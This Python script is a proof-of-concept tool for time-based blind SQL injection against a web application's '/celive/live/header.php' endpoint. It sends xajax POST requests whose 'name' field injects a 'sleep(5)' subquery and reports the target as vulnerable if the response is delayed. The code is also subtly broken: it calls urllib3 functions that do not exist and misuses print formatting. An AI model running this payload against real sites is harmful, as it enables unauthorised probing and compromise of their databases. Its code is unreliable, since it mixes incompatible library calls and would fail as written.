#! /usr/bin/env python
# -*- coding: utf-8 -*-
# Author: Xuchao


import urllib3
import sys
import time
import requests


def verify(url):
    target = "%s/celive/live/header.php" % url
    # 要发送的数据
    post_data1 = {
        'xajax': 'LiveMessage',
        'xajaxargs[0][name]': "1',(SELECT IF(1=2, sleep(5), '1')),"
                              "'','','','1','127.0.0.1','2') #"
    }
    # 有延时的 Payload
    post_data2 = {
        'xajax': 'LiveMessage',
        'xajaxargs[0][name]': "1',(SELECT IF(1=1, sleep(5), '1')),"
                              "'','','','1','127.0.0.1','2') #"
    }
    try:
        # 记录开始请求的时间
        start_time = time.time()
        # 发送 HTTP 请求
        req = urllib3.urlopen(target, data=urllib3.urlencode(post_data1))
        urllib3.urlopen(req)
        # 记录正常请求并收到响应的时间
        end_time_1 = time.time()
        req2 = urllib3.request(target, data=urllib3.urlencode(post_data2))
        urllib3.urlopen(req2)
        # 收到响应的时间
        end_time_2 = time.time()
        # 计算时间差
        delta1 = end_time_1 - start_time
        delta2 = end_time_2 - end_time_1
        # print "delta1: %s, delta2: %s" % (str(delta1), str(delta2))
        if (delta2 - delta1) > 4:
            print ("%s is vulnerable") % target
        else:
            print ("%s is not vulnerable") % target
    except Exception as e:
        print ("Something happend...")
        print (e)


def main():
    args = sys.argv
    url = ""

    if len(args) == 2:
        url = args[1]
        verify(url)
    else:
        print ("Usage: python %s url" % (args[0]))

if __name__ == '__main__':
    main()